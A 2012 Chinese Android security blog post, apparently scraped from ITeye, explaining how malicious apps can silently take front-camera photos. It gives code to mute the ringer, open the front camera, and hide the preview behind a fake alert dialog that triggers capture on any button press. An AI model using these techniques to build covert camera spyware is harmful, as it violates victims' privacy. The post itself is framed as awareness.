@@ -1,0 +1,472 @@
+
+首页资讯精华论坛问答博客专栏群组更多 ▼
+
+ 
+您还未登录 !登录注册
+
+
+
+
+su1216
+
+
+博客
+微博
+相册
+收藏
+留言
+关于我
+
+
+
+
+.
+
+
+
+
+android安全问题（一） 静音拍照与被拍
+博客分类： android
+ 
+android安全静音拍照病毒前置摄像头.
+
+
+之前写过一些android手机root之后的安全问题的（文章列表见末尾），其实我是想到哪就写到了，今天整理硬盘，发现一年之前写过一段代码，所以今天我们就一起来讨论一下。
+ 
+ 
+ 
+注：这里不是讨论多nb的技术，而是希望不了解android风险的人了解我们所处的状态
+ 
+ 
+ 
+导读：
+ 
+本文介绍了所谓的静音拍照是如何实现的（当然这也是一种恶意软件，只不过受害的不是用户），和用户自己如何被恶意软件拍照的
+ 
+ 
+ 
+由于iteye不允许偷和拍放到一起，所以……静音拍照，大家懂的，静音拍照？不就是……
+ 
+今天的主题是静音拍照与被拍
+ 
+当然，这里的“被拍”不是指你拿着手机在地铁上深入女同学裙下的女同学（貌似日本人喜欢干这种事情，自行百度其新闻）
+ 
+这里指的被拍是：你玩着玩着游戏，突然前置摄像头被恶意应用打开，然后咔嚓，然后……
+ 
+ 
+ 
+想要实现这些功能，很遗憾，即是没有root权限也可以
+ 
+ 
+ 
+ 
+ 
+下面我们来说正题
+ 
+首先说静音拍照
+ 
+其实也就是说静音拍照嘛，怎么实现？当然是先静音再拍照了……最后记得恢复静音前的状态即可。
+ 
+有的手机直接调解照相快门音量即可，但是没有通用的api，似乎这种手机也很少（第三方的rom可能会有）
+ 
+另一个办法就是把手机调成静音模式，然后拍照。不过也不是理想的，有些手机虽然调成了静音模式，但是快门不静音，就像闹钟不静音一样。
+ 
+还有一些其他的静音方式，这里就不说了。如何把手机调成静音？这个没什么技术含量，大家可自行百度。。。
+ 
+ 
+ 
+
+
+Java代码  
+1.mAudioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);  
+2.mAudioManager.setRingerMode(AudioManager.RINGER_MODE_SILENT);  
+ 
+当然，你最好先记录下用户之前的模式
+ 
+
+
+Java代码  
+1.int ringerMode = mAudioManager.getRingerMode();  
+ 
+这样部分手机的静音拍照就搞定了，比如我使用的g14(android 2.3)就可以达到静音的目的了（所以说htc手机操蛋，现在及其反感htc）
+ 
+ 
+ 
+下面说一下被拍
+ 
+被拍呢，我会选择前置摄像头，玩手机的时候一般人不看手机屁股，因为htc嘛
+ 
+首先说一下android的摄像头
+ 
+前置摄像头的通用api是在2.3才开始有的，2.2及之前都需要靠反射调用，不过那时有前置摄像头的android手机也很少
+ 
+这里我们以2.3为基础作为演示
+ 
+步骤：
+ 
+0.伪装
+ 
+1.打开前置摄像头
+ 
+2.静音+拍照+退出
+ 
+3.保存
+ 
+ 
+ 
+首先来看看如何调用前置摄像头（当然，你得有前置摄像头才行）
+ 
+
+
+Java代码  
+1.mCamera = openCamera(CameraInfo.CAMERA_FACING_FRONT);  
+2.public static Camera openCamera(int which) {  
+3.    return Camera.open(which);  
+4.}  
+ 
+如果没Camera不为null，那么就是成功了
+ 
+ 
+ 
+最关键的是伪装，android系统中，调用摄像头必须要有预览画面才行，当然，这也是为了安全
+ 
+所以拍照时必须有一个窗口，也就是你玩着玩着游戏的时候，突然弹出个窗口给你拍个大头贴
+ 
+用户看到预览画面了，那傻子都知道他被人黑了，所以病毒不能这么傻，它会给自己穿件外套
+ 
+我做了一件粗糙的外套来给大家演示
+ 
+
+当然这个外套比较烂，真正的病毒会做一个很精致，并且比较常见的外套（这样成功率才会高，如果用户手机根本没有股票软件，而我却弹出这么一个对话框，用户再傻也会知道自己中毒了）
+ 
+ 
+ 
+下面的操作，无论用户点击确定、取消还是back键，病毒都会拍一张照片然后保存，然后……
+ 
+ 
+ 
+camera.xml对应的代码
+ 
+
+
+Xml代码  
+1.<?xml version="1.0" encoding="utf-8"?>  
+2.<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"  
+3.    android:orientation="vertical"  
+4.    android:layout_width="300dp"  
+5.    android:layout_height="150dp"  
+6.    android:background="@color/canvas_background">  
+7.    <LinearLayout  
+8.        android:layout_width="wrap_content"  
+9.        android:layout_height="wrap_content">  
+10.        <SurfaceView  
+11.            android:layout_width="wrap_content"  
+12.            android:layout_height="wrap_content"  
+13.            android:id="@+id/alert_camera"/>  
+14.    </LinearLayout>  
+15.    <include layout="@layout/fake"/>  
+16.</FrameLayout>  
+   
+fake.xml对应的代码
+ 
+
+
+Java代码  
+1.<?xml version="1.0" encoding="utf-8"?>  
+2.<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"  
+3.    android:layout_width="fill_parent"  
+4.    android:layout_height="fill_parent"  
+5.    android:orientation="vertical">  
+6.    <!-- title -->  
+7.    <LinearLayout  
+8.        android:layout_width="fill_parent"  
+9.        android:layout_height="wrap_content"  
+10.        android:layout_weight="1"  
+11.        android:layout_gravity="center_vertical"  
+12.        android:background="@color/canvas_background">  
+13.        <ImageView  
+14.            android:layout_width="wrap_content"  
+15.            android:layout_height="wrap_content"  
+16.            android:layout_margin="10dp"  
+17.            android:src="@drawable/ic_dialog_alert"/>  
+18.        <TextView  
+19.            android:layout_width="wrap_content"  
+20.            android:layout_height="wrap_content"  
+21.            android:layout_marginTop="10dp"  
+22.            android:layout_marginBottom="10dp"  
+23.            android:id="@+id/alert_title"  
+24.            android:text="@string/alert_title"  
+25.            android:textSize="22sp">  
+26.        </TextView>  
+27.    </LinearLayout>  
+28.    <!-- line -->  
+29.    <!-- message -->  
+30.    <LinearLayout  
+31.        android:layout_width="fill_parent"  
+32.        android:layout_height="wrap_content"  
+33.        android:layout_weight="1"  
+34.        android:layout_gravity="center_vertical"  
+35.        android:background="@color/canvas_background">  
+36.        <TextView  
+37.            android:layout_width="wrap_content"  
+38.            android:layout_height="wrap_content"  
+39.            android:layout_margin="10dp"  
+40.            android:id="@+id/alert_message"  
+41.            android:text="@string/alert_message"  
+42.            android:textSize="18sp">  
+43.        </TextView>  
+44.    </LinearLayout>  
+45.    <!-- line -->  
+46.    <!-- button -->  
+47.    <LinearLayout  
+48.        android:layout_width="fill_parent"  
+49.        android:layout_height="wrap_content"  
+50.        android:orientation="horizontal"  
+51.        android:layout_weight="1"  
+52.        android:background="@color/button_background">  
+53.        <Button  
+54.            android:layout_width="wrap_content"  
+55.            android:layout_height="wrap_content"  
+56.            android:layout_weight="1"  
+57.            android:id="@+id/alert_ok"  
+58.            android:text="@string/alert_ok"/>  
+59.        <Button  
+60.            android:layout_width="wrap_content"  
+61.            android:layout_height="wrap_content"  
+62.            android:layout_weight="1"  
+63.            android:id="@+id/alert_cancel"  
+64.            android:text="@string/alert_cancel"/>  
+65.    </LinearLayout>  
+66.</LinearLayout>  
+ 
+ ic_dialog_alert.png就是上图显示的叹号，在frameworks/base/core/res下面就有，复制出来一个就行
+ 
+上面只是布局代码，我们的activity也需要做一些设置，比如在manifest里要设置主题为
+ 
+
+
+Xml代码  
+1.android:theme="@android:style/Theme.Dialog"  
+ 
+在onCreate里面要设置下面这些属性，我就不一一解释了
+ 
+
+
+Java代码  
+1.requestWindowFeature(Window.FEATURE_NO_TITLE);  
+2.Window window = getWindow();  
+3.window.setFormat(PixelFormat.TRANSLUCENT);  
+4.window.setType(WindowManager.LayoutParams.TYPE_SYSTEM_ALERT);  
+5.window.setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,  
+6.        WindowManager.LayoutParams.FLAG_FULLSCREEN);  
+7.setContentView(R.layout.camera);  
+ 
+到这里，关键的地方就都完成了
+ 
+manifest中还需要配置一些权限
+ 
+
+
+Xml代码  
+1.<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />  
+2.<uses-permission android:name="android.permission.CAMERA" />  
+3.<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>  
+   
+ 
+ 
+ 
+ 
+正常的拍照流程代码网上很多，我也不贴了，最后附上的colors.xml文件吧
+ 
+
+
+Xml代码  
+1.<resources>    
+2.    <color name="button_background">#ffffff</color>  
+3.    <color name="canvas_background">#ffffffcc</color>  
+4.</resources>    
+   
+最后再说两句，如果有了root权限，那么病毒就可以替换快门声的音频文件，或者数据库存储指向快门声音的Uri，这样就能彻底的实现静音拍照了
+ 
+当然，你想静音拍照别人，没准你也被别人静音拍照了，自重
+ 
+ 
+ 
+ 
+ 
+android手机root后的安全问题 （一）
+ 
+android手机root后的安全问题 （二）
+ 
+android手机root后的安全问题 （三）
+ 
+android手机root后的安全问题 （四）
+ 
+ 
+ 
+ 
+ 
+
+
+android安全问题（一） 静音拍照与被拍
+ 
+android安全问题（二） 程序锁
+ 
+android安全问题（三） 钓鱼程序
+ 
+
+
+
+ 
+ 
+请大家不要用root的手机随意下载软件，更不要以任何借口制造任何病毒！
+ 
+ 
+ 
+ 
+ 
+转贴请保留以下链接
+ 
+本人blog地址
+ 
+http://su1216.iteye.com/
+ 
+http://blog.csdn.net/su1216/
+
+
+
+2 
+顶
+
+3 
+踩.
+
+分享到： 
+.
+
+android安全问题（二） 程序锁| 《Unix & Linux 大学教程》 - 第二十二章 ...
+
+2012-10-12 12:00
+浏览 1840
+评论(2)
+分类:移动开发
+相关推荐
+
+
+评论
+
+
+2 楼 su1216 2012-11-08   
+
+
+bing_zz 写道
+
+说得我心头咯噔咯噔直响...
+
+表激动，在官网下载软件情况就会好些，注意声明的权限，有没有什么不该出现的 
+
+1 楼 bing_zz 2012-11-08   
+
+说得我心头咯噔咯噔直响...
+ 
+
+发表评论
+
+ 您还没有登录,请您登录后再发表评论 
+
+
+
+
+
+
+su1216
+ 
+浏览: 65621 次
+性别: 
+来自: 北京
+
+
+
+最近访客 更多访客>>
+
+
+
+
+rimoer
+
+
+
+
+zht19880706
+
+
+
+
+heavensay
+
+
+
+
+woyaowenzi
+.
+
+博客专栏
+深入入门正则表达式（jav...
+浏览量：6019.android手机的安全问...
+浏览量：18362.
+
+文章分类
+■全部博客 (93)
+■android (37)
+■Unix & Linux 大学教程 (22)
+■Linux命令行与shell脚本编程大全 (10)
+■java (5)
+■java多线程 (3)
+■虚拟机 (7)
+■设计模式 (1)
+■正则表达式 (6)
+■数据库 (1)
+■其他 (1)
+■转贴 (1)
+
+
+社区版块
+■我的资讯 (0)
+■我的论坛 (70) 
+■我的问答 (19)
+
+
+存档分类
+■2013-02 (1)
+■2013-01 (5)
+■2012-12 (7)
+■更多存档...
+
+
+评论排行榜
+■android手机root后的安全问题 （二）
+■android安全问题（二） 程序锁
+■android安全问题（四） 抢先开机启动 - ...
+■android安全问题（三） 钓鱼程序
+■android手机root后的安全问题 （一）
+
+
+最新评论
+N_HH： su1216 写道N_HH 写道那个，请问，pm是什么。。不懂 ...
+android手机root后的安全问题 （四）
+su1216： N_HH 写道那个，请问，pm是什么。。不懂。shell@an ...
+android手机root后的安全问题 （四）
+N_HH： 那个，请问，pm是什么。。不懂。
+android手机root后的安全问题 （四）
+su1216： tjwink 写道既然已经知道su的数据库地址，可以直接用DB ...
+android手机root后的安全问题 （三）
+tjwink： 既然已经知道su的数据库地址，可以直接用DBOpenHelpe ...
+android手机root后的安全问题 （三）
+
+.
+
+
+--------------------------------------------------------------------------------
+声明：ITeye文章版权属于作者，受法律保护。没有作者书面许可不得转载。若作者同意转载，必须以超链接形式标明文章原始出处和作者。
+© 2003-2012 ITeye.com. All rights reserved. [ 京ICP证110151号 京公网安备110105010620 ] 
+.
